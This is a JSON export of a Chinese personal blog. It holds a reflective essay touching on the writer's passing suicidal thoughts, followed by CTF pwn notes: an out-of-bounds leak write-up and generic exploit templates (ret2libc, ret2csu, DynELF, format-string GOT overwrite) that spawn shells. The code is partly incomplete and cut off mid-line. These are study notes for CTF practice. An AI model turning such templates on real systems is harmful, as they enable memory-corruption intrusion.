我无意探讨人类科学或者社会准则，我只是想写下我的愚蠢。我以为大家都没有心之所向，殊不知我只是个思维简单的二极管。这件事并不是非黑即白的，我们可以拥有并不是真心喜欢的东西，但是其中“真心喜欢”有几分，“不真心喜欢”又有几分？</p>\n<p>​        这是一个很难界定的问题。</p>\n<h5 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1:\"></a>1:</h5><p>​        前些日子，感觉提不起劲头，直到听说对面寝室楼有姐姐跳楼，心情一下变得非常复杂。</p>\n<p>​        之所以复杂，是因为那时，我第一次完整地理解了决定轻生的人的心情。</p>\n<p>​        活着的盼头，很难找到，但很容易就消失得一干二净了。第一次有死亡的念头，虽然念头维持的时间确实是一瞬即逝的，但是情绪还是在一瞬间爆发了。</p>\n<p>​        虽然现在已经暂时找到了努力的方向，但是曾经挂在我心里明晃晃的太阳遮了大半。</p>\n<p>​        然后我尝试与他人交流，不断地在意别人对于这件事情的看法，几天下来，我对自己的评价是：“太脆弱。”</p>\n<p>​        这几天，最触动的话是 “这世界上大部分的人都在经受苦难，那么多人，都扛下去了，你凭什么不能”，来源于刘畅两年前的周三电台。张麻子也给我讲了学校一个朋友高中练习电吉他的事，说他每天晚上为了躲避家人，从两点练琴到四点，并且没有耳机，更没有音箱。</p>\n<p>​        接着我又想到高中时那些搞基础学科竞赛的同学，诸如此类的例子太多了，难道我经受的痛苦就一定比他们更加深，更加难以摆脱吗。</p>\n<p>​        我还是一个太过脆弱的人，我过度放大苦难，并将苦难视为伴随我身体生存的共生体，既然不能从胜利中获得满足，那就从失败中获得满足。</p>\n<p>​        这是我人生十几年，从各种离奇的环境中，生长出的畸形的心理缓解措施，我现在知道，这样的心情都是被刻意勾画出来的，严重程度尚不至此。虽然此时此刻我的心情依旧是抑郁的，但是我应当劝说自己。</p>\n<h5 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2:\"></a>2:</h5><p>​        聊完了我对于苦难的态度，再来聊聊苦难本身吧。</p>\n<p>​        我觉得这些困难，并不来源于身体上的劳累——这些其实是最不值一提的，一般的人都不会在这一步上摔倒。</p>\n<p>​        困难多来自于自我否定，与外界环境的压力。换句话说，更多的是走不出心理上的低谷。</p>\n<p>​        这件事确实十分离奇，一不下心就会陷入无限的正反馈，要么成绩变差，然后不断被周围的人唾弃，然后成绩更差，或者成绩变好，为了维持住周围人的赞扬，于是更加努力。</p>\n<p>​        为了打破这样的循环，破局之处在于正反馈形成的逻辑。成绩的好坏有时候并不是个体更够完全掌控的事情，而能控制的环节，是“我”对于他人看法的回应。我完全可以不在意他人的看法，毕竟不管我当前怎样，与最后结果判定时的成绩关系并不紧密。</p>\n<p>​        但是这往往是比闭着眼睛努力更难的事。一直以来，总有人说，在面试，考试等场景下，心态会比实力更重要。虽然我并不完全认同，但是如果在这话前加一些前置条件，就说得通了，比如说“整个学习过程中的心态”</p>\n<p>​        从各种方面已经展示了我极为差劲的心理素质，怎么改善，我应该去好好思考。</p>\n<p>​    </p>\n<p>​        </p>\n<p>​        </p>\n","categories":["深夜高速"],"tags":["mess"]},{"title":"2019_your_pwn","url":"/2022/03/14/2019_your_pwn/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n\t\t\t<script>\n\t\t\t\tconsole.error(\"ReferenceError: value is not defined\");\n\t\t\t</script>     \n\n<p>​        因为是数组越界，每次只能读取一个字节，所以脚本需要循环，首先计算出偏移获取函数的地址，一般来说比较常规的思路是拿<code>libc_start_main    </code>,只是这里的偏移比较远。</p>\n<p>​    ps： 关于如何在看起来比较混乱的栈中找到偏移量这件事</p>\n<p>​        首先要搞清楚函数逻辑，就是不管有多简单也不能想当然的那种搞清楚。</p>\n<p>​        这里一共有三个关键的变量，v4，idx和v2，idx是v4数组的索引，用来leak地址。v2用来填content，最后把v2赋给<code>v4[idx]</code>。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-14%20%E4%B8%8B%E5%8D%8810.00.59.png\" alt=\"截屏2022-03-14 下午10.00.59\"></p>\n<p>​        所以在地址上索引的地址和内容是不完全连续的。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8A%E5%8D%8810.45.31.png\" alt=\"截屏2022-03-15 上午10.45.31\"></p>\n<p>​        这里2e0是输入的idx，568是需要被泄露的地址，大致的索引应该是648左右，更精确的需要调试得出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    p = remote()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x45216</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;name&#x27;</span>,<span class=\"string\">&#x27;aa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">638</span>,<span class=\"number\">632</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;(hex) &#x27;</span>)</span><br><span class=\"line\">\txx = p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;value\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(xx)&lt;<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\tlibc_start_main += <span class=\"string\">&#x27;0&#x27;</span> + xx    </span><br><span class=\"line\">\t<span class=\"keyword\">elif</span>(<span class=\"built_in\">len</span>(xx)==<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\tlibc_start_main += xx[-<span class=\"number\">2</span>:]</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tlibc_start_main += xx</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main))</span><br><span class=\"line\">libc_start_main = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;0x&#x27;</span> + libc_start_main,<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_start_main-libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">one_gadget += libc_base </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):   </span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;index\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">344</span>+i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;value\\n&#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">ord</span>(p64(one_gadget)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["STACK - ARRAY OUT OF BOUNDS"],"tags":["stack"]},{"title":"pwn知识点总结","url":"/2022/03/21/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-hAzaQBWj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>[TOC]</p>\n<h1 id=\"stack\"><a href=\"#stack\" class=\"headerlink\" title=\"stack\"></a>stack</h1><h2 id=\"漏洞点\"><a href=\"#漏洞点\" class=\"headerlink\" title=\"漏洞点\"></a>漏洞点</h2><h3 id=\"控制程序执行流\"><a href=\"#控制程序执行流\" class=\"headerlink\" title=\"控制程序执行流\"></a>控制程序执行流</h3><h4 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h4><h5 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h5><p>​        利用程序自带的gadget，构造syscall。</p>\n<p>​        <a href=\"https://fuurinko.github.io/2022/03/21/%E4%B8%80%E4%BA%9B%E6%9D%BF%E5%AD%90/\">对应板子</a></p>\n<h5 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h5><h5 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h5><h3 id=\"泄露内存\"><a href=\"#泄露内存\" class=\"headerlink\" title=\"泄露内存\"></a>泄露内存</h3><h4 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h4><h5 id=\"1）泄露任意地址\"><a href=\"#1）泄露任意地址\" class=\"headerlink\" title=\"1）泄露任意地址\"></a>1）泄露任意地址</h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">--------获取栈变量对应的地址------------</span><br><span class=\"line\">%n<span class=\"variable\">$p</span> <span class=\"comment\">#输出栈上第n+1个格式化字符串输出参数</span></span><br><span class=\"line\">--------获取栈变量对应的字符串----------</span><br><span class=\"line\">%n<span class=\"variable\">$s</span><span class=\"comment\">#输出栈上第n+1个格式化字符串参数对应的字符串</span></span><br><span class=\"line\">--------获取任意地址内容---------------</span><br><span class=\"line\">addr%n<span class=\"variable\">$s</span>\t</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"Extra\"><a href=\"#Extra\" class=\"headerlink\" title=\"Extra:\"></a>Extra:</h6><p>​        对于格式化字符串地址偏移的计算，32位和64位并不完全相同，32位参数完全由栈传递，所以参数在栈上出现的位次即是偏移（要减去返回地址占的位次），但是64位传参前六位是由寄存器传参，因此在栈上找到的偏移需要加6。</p>\n<h4 id=\"数组越界\"><a href=\"#数组越界\" class=\"headerlink\" title=\"数组越界\"></a>数组越界</h4><h4 id=\"覆盖空字节\"><a href=\"#覆盖空字节\" class=\"headerlink\" title=\"覆盖空字节\"></a>覆盖空字节</h4><p>​        </p>\n<h3 id=\"修改内存\"><a href=\"#修改内存\" class=\"headerlink\" title=\"修改内存\"></a>修改内存</h3><h4 id=\"格式化字符串-1\"><a href=\"#格式化字符串-1\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h4><h5 id=\"利用fmt-payload模块自动化写入\"><a href=\"#利用fmt-payload模块自动化写入\" class=\"headerlink\" title=\"利用fmt_payload模块自动化写入\"></a>利用fmt_payload模块自动化写入</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"手工构造\"><a href=\"#手工构造\" class=\"headerlink\" title=\"手工构造\"></a>手工构造</h5><h6 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h6><p><code>%n</code>参数不输出字符，但是把已成功输出的字符个数写入对应整形指针参数所指的变量。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">addr%k<span class=\"variable\">$n</span><span class=\"comment\">#k为格式化字符串偏移，addr为需要覆盖的地址</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">%hhn <span class=\"comment\">#向地址写入单字节</span></span><br><span class=\"line\">%hn <span class=\"comment\">#向地址写入双字节</span></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Generalization"],"tags":["summary"]},{"title":"一些板子","url":"/2022/03/21/%E4%B8%80%E4%BA%9B%E6%9D%BF%E5%AD%90/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-jbIFkHjE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h1 id=\"stack\"><a href=\"#stack\" class=\"headerlink\" title=\"stack\"></a>stack</h1><h2 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = </span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>* offset + p64(puts_plt) + p64(main) + p64(libc_start_main_got)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">b&#x27;?&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_start_main_addr = u64(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(p64(libc_start_main_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class=\"line\">libcbase = libc_start_main_addr - libc.dump(<span class=\"string\">&#x27;__libc_start_main&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>* offset + p64(system_addr) + p64(<span class=\"number\">0xdeadbeef</span>) + p64(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<h2 id=\"ret2csu\"><a href=\"#ret2csu\" class=\"headerlink\" title=\"ret2csu\"></a>ret2csu</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;&quot;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x400690</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x4006AA</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * offset </span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * (offset - <span class=\"number\">0x48</span>)</span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span></span><br><span class=\"line\"><span class=\"string\">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">log.success(&#x27;system_addr &#x27; + hex(system_addr))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">p.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"DynELF\"><a href=\"#DynELF\" class=\"headerlink\" title=\"DynELF\"></a>DynELF</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bof&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./bof&#x27;</span>)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">write_plt = elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">start_addr = <span class=\"number\">0x080483d0</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x0804a020</span></span><br><span class=\"line\">pppr_addr = <span class=\"number\">0x0804856c</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x08048484</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">addr</span>):</span></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&#x27;a&#x27;</span>*offset</span><br><span class=\"line\">\tpayload += p32(write_plt)</span><br><span class=\"line\">\tpayload += p32(ret_addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tpayload += p32(addr)</span><br><span class=\"line\">\tpayload += p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tp.send(payload)</span><br><span class=\"line\">\tdata = p.recv()</span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d = DynELF(leak,elf = elf)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;libc&#x27;</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ret2vuln</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*offset</span><br><span class=\"line\">payload += p32(read_plt)</span><br><span class=\"line\">payload += p32(pppr_addr)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(bss_addr)</span><br><span class=\"line\">payload += p32(<span class=\"number\">8</span>)</span><br><span class=\"line\">payload += p32(system_addr)</span><br><span class=\"line\">payload += p32(ret_addr)</span><br><span class=\"line\">payload += p32(bss_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"FMT\"><a href=\"#FMT\" class=\"headerlink\" title=\"FMT\"></a>FMT</h2><p>（利用pwntools的fmt module实现自动化修改got）</p>\n<h3 id=\"32bit\"><a href=\"#32bit\" class=\"headerlink\" title=\"32bit\"></a>32bit</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算偏移量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_fmt</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    r.sendline(payload)</span><br><span class=\"line\">    info = r.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> info</span><br><span class=\"line\">  </span><br><span class=\"line\">auto = FmtStr(exec_fmt)</span><br><span class=\"line\">offset = auto.offset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的 got 地址</span></span><br><span class=\"line\">func_got = elf.got[<span class=\"string\">&#x27;func&#x27;</span>]<span class=\"comment\">#func通常是一些例如printf或puts的函数</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_got =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_got)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的真实地址</span></span><br><span class=\"line\">payload = p32(func_got) + <span class=\"string\">&#x27;%&#123;&#125;$s&#x27;</span>.<span class=\"built_in\">format</span>(offset)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">func_addr = u32(r.recv()[<span class=\"number\">4</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 system 的真实地址</span></span><br><span class=\"line\">system_addr = func_addr - (libc.symbols[<span class=\"string\">&#x27;func&#x27;</span>] - libc.symbols[<span 